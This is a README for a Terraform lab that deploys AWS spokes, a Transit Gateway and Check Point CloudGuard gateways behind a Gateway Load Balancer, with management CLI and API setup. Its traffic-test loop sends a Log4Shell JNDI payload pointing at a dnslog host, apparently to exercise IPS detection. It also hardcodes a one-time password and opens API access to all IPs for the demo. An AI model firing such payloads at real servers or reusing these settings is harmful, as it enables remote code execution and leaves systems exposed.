# AWS lab with App spokes, TGW and CHKP VPC with CloudGuard Network Security behind GWLB

### Check Point Management SSH KEY pair

We are using existing AWS [SSH key pair](https://eu-west-1.console.aws.amazon.com/ec2/home?region=eu-west-1#KeyPairs:)

Please make sure SSH key pair exists and is referenced in `main.tf` under `cpman` module as `cpman_ssh_keypair` input variable. Default key pair name is `cpman`.

### Deploy with Terraform

```shell
# working folder
cd /workspaces/tf-playground/50-aws-tgw-chkp-vpc

# alias terraform
alias tf=terraform

# bring dependencies - providers, modules, ...
tf init

# bring credentials - e.g. export env vars: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

# review the code

# do credentials work?
tf plan -target module.env

# step by step deployment (to follow what was build in both code and AWS Console)

# network environment
tf apply -auto-approve -target module.env

# workloads in spokes accessible using SSM
#   used to initiate eggress and E-W traffic
tf apply -auto-approve -target module.instances

# Check Point Management in Inspection VPC
#   shared VPC with securure Internet access and E-W inspection
tf apply -auto-approve -target module.cpman

# Check Point Security Gateways with GWLB in Inspection VPC
#   deploy CGNS behind GWLB into Security (Inspection) VPC
tf apply -auto-approve -target module.cgns

# routing setup
#    route via CGNG thanks to GWLBe
tf apply -auto-approve -target module.routes

# or full deployment - one shot
tf apply -auto-approve

# CP management console
#   lets wait in CPMAN EC2 Instance serial console until ot is ready

# IP and creds for CPMAN cli access
MGMTIP=$(tf output -raw cpman_ip)
# for local Win machine Powershell? - assuming cpman private SSH key in home .ssh subfolder
echo ssh admin@$MGMTIP -i '$env:HOMEDRIVE$env:HOMEPATH/.ssh/cpman.pem'

# === MANAGEMENT CLI ===
#   once Check Point Managemeng server is initialized => 
watch -d api status

# x-chkp-tags	management=CP-Management-gwlb-tf:template=gwlb-configuration:ip-address=private

# this is how CPMAN find instances to provide with policy and provision under Check Point Management
autoprov_cfg init AWS -mn CP-Management-gwlb-tf -tn gwlb-configuration -otp WelcomeHome1984 -po Standard -cn cpman -r eu-west-1 -iam -ver R81.20
# update template to enable IPS and Identity Awareness
autoprov_cfg set template -tn gwlb-configuration -ia -ips
# check full setup
autoprov_cfg show all

# monitor CME finding and provisioning gateways
tail -f /var/log/CPcme/cme.log


### POLICY

# will manage using Check Point API service - allow any IP access (ok, for demo, be more specific in real world)
mgmt_cli -r true set api-settings accepted-api-calls-from 'All IP addresses' --domain 'System Data'; api restart

# create dedicated api user
mgmt_cli -r true add administrator name "api" permissions-profile "read write all" authentication-method "api key"  --domain 'System Data' --format json

# add api-key - api user credential
# https://sc1.checkpoint.com/documents/latest/APIs/index.html#cli/add-api-key~v1.9.1%20
mgmt_cli -r true add api-key admin-name "api"  --domain 'System Data' --format json

# now we have following CPMAN information - take note for 51-tf-aws-policy terraform deployment
# management IP address
# manafement server API token - representing user "api"
```

### CONNECTIVITY FROM SPOKE INSTANCES

```shell
#connectivity test from spoke hosts
while true; do curl 10.11.10.11 -m1; curl 10.10.10.10 -m1; curl -s -m1 ip.iol.cz/ip/; echo; ping -c1 1.1.1.1; sleep 3; curl -s -m2 ip.iol.cz/ip/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}';  done


# remove
tf destroy -auto-approve -target module.routes
tf destroy -auto-approve -target module.cgns
tf destroy -auto-approve -target module.cpman
tf destroy -auto-approve -target module.instances
tf destroy -auto-approve -target module.env

```

TODO:
- [ ] enable Management API and provision API user
 -[ ] management license?
- [ ] Gaia timezone 
- [ ] diagrams
- [ ] create SSH key with Terraform and add CPMAN login instructions
- [ ] policy made by Terraform
- [ ] E-W and Ingress traffic inspection
- [ ] TF unexpceted replacement - lifecycle / ignore_changes fine tune!


References:
* Inspired by work at https://github.com/aws-samples/aws-network-firewall-terraform/
    * Diagram https://github.com/aws-samples/aws-network-firewall-terraform/blob/main/images/anfw-terraform-sample.jpg
